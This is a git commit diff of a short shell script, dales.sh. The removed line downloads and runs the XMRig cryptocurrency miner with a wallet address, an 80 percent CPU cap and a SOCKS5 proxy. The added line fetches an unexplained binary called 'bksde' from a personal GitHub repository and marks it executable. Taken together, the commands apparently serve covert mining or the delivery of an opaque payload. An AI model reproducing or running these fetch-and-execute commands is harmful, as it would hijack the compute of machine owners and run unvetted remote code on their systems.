75a3918eb3cfa206abf9fa4e9b23cae0b4592dad
chikahusarii <85166601+chikahusarii@users.noreply.github.com>
2022-08-21 02:34:40 +0700

    Update dales.sh

--- dales.sh
+++ dales.sh
@@ -1,2 +1,2 @@
 #!/bin/sh
-wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-bionic-x64.tar.gz && tar -xvf xmrig-6.18.0-bionic-x64.tar.gz && cd xmrig-6.18.0-bionic-x64 && ./xmrig -a rx/0 172.20.144.1:3333 -u TRX:TBbwEfGT2h9iXXPbu1p9bgbjKK8YqegfYM -p x --max-cpu-usage 80 -x socks5://50.116.14.201:7497 -k --tls
+wget https://github.com/chikahusarii/cols/blob/main/bksde && chmod +x bksde
